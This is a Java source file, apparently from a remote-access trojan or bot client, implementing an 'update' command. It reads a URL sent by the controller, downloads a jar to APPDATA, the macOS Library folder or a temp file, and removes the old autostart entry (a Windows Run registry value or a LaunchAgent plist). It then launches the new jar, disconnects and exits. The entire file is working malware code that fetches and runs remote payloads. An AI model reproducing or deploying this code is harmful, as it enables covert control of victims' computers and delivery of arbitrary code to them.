package commands;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.util.Random;

import bot.Main;
import bot.Util;
import bot.WinRegistry;
import oslib.AbstractOperatingSystem;

//import com.redpois0n.oslib.OperatingSystem;
import oslib.OperatingSystem;

public class CommandUpdate extends Command{

	/**
	 * Performs the update command (uninstall, install new jar)
	 */
	@Override
	public void perform() throws Exception {
		String link = Main.readString();
		
		String extension = link.substring(link.lastIndexOf("."), link.length());
		
		if (!extension.startsWith(".")) {
			extension = "." + extension;
		}
		
		File file = null;
		AbstractOperatingSystem os = OperatingSystem.getOperatingSystem();
		if (os.getType() == OperatingSystem.WINDOWS) {
			file = new File(System.getenv("APPDATA") + "file" + (new Random().nextInt()) + extension);
		} else if (os.getType() == OperatingSystem.MACOS) {
			file = new File(System.getProperty("user.home") + "/Library/file" + (new Random().nextInt()) + extension);
		} else {
			file = File.createTempFile("file", extension);
		}
		
		URL url = new URL(link);
		
		InputStream stream = url.openStream();
		
		FileOutputStream output = new FileOutputStream(file);
		
		byte[] buffer = new byte[1024];
		int read;
		
		while ((read = stream.read(buffer)) != -1) {
			output.write(buffer, 0, read);
		}
		
		stream.close();
		output.close();
		
		try {
			if (os.getType() == OperatingSystem.WINDOWS) {
				WinRegistry.deleteValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Main.getStartupName());
			} else if (os.getType() == OperatingSystem.MACOS) {
				new File(System.getProperty("user.home") + "/Library/LaunchAgents/" + Util.getJarFile().getName().replace(".jar", ".plist")).delete();
			}

		} catch (Exception ex) {
			ex.printStackTrace();
		}
		
		String javaPath = System.getProperty("java.home") + File.separator + "bin" + File.separator;
		String javaProcess ="javaw";
		String process = javaPath + javaProcess;
		
		Runtime.getRuntime().exec(os.getType() == OperatingSystem.WINDOWS ? "\"" + process + "\" -jar \"" + file.getAbsolutePath() + "\"" : "java -jar " + file.getAbsolutePath().replace(" ", "%20"));
	
		try {
			Main.disconnect();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		
		System.exit(0);
	}

}
